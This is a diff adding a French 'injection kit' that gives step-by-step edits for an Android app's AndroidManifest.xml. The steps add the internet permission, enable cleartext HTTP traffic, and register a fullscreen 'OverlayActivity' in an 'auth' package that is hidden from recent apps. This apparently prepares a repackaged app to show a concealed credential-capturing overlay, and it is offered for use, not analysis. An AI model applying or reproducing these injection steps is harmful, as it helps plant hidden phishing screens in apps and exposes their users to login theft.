@@ -1,0 +1,33 @@
+=====================================================
+  KIT D'INJECTION — AndroidManifest.xml
+=====================================================
+
+ÉTAPE 1 : Vérifier que cette permission existe (sinon l'ajouter)
+-----------------------------------------------------------------
+Ajouter dans <manifest> AVANT <application> :
+
+    <uses-permission android:name="android.permission.INTERNET"/>
+
+
+ÉTAPE 2 : Activer le trafic HTTP (obligatoire Android 9+)
+-----------------------------------------------------------
+Dans la balise <application>, ajouter cet attribut :
+
+    android:usesCleartextTraffic="true"
+
+Exemple :
+    <application android:allowBackup="true" ... android:usesCleartextTraffic="true">
+
+Sans cet attribut, Android bloque les requêtes HTTP et l'app affiche "Network error".
+
+
+ÉTAPE 3 : Ajouter l'OverlayActivity
+-------------------------------------
+Ajouter DANS <application> (avant </application>) :
+
+        <activity
+            android:name="com.example.auth.OverlayActivity"
+            android:excludeFromRecents="true"
+            android:exported="false"
+            android:launchMode="singleTask"
+            android:theme="@android:style/Theme.DeviceDefault.NoActionBar.Fullscreen"/>
